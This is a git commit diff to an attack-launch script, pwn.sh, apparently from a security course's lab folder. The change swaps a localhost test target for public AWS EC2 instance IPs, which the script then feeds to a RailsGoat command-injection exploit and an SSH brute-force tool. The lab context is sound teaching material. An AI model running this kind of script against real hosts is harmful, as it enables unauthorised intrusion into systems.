9d69c613df26f3a00c2ec81b5c1cf1cce7030eaa
Javier Godinez <godinezj@gmail.com>
2016-06-15 11:09:11 -0700

    removed debug line

--- Week-4/scripts/pwn.sh
+++ Week-4/scripts/pwn.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 
-# IP_ADDRESSES=`aws ec2 describe-instances --profile target | jq -r '.Reservations[] | .Instances[] | .PublicIpAddress' | grep -v null`
-IP_ADDRESSES=localhost
+IP_ADDRESSES=`aws ec2 describe-instances --profile target | jq -r '.Reservations[] | .Instances[] | .PublicIpAddress' | grep -v null`
 
 ruby -W0 railsgoat_cmd_injection.rb $IP_ADDRESSES
 ./bruteforce_ssh_public_IP.rb $IP_ADDRESSES
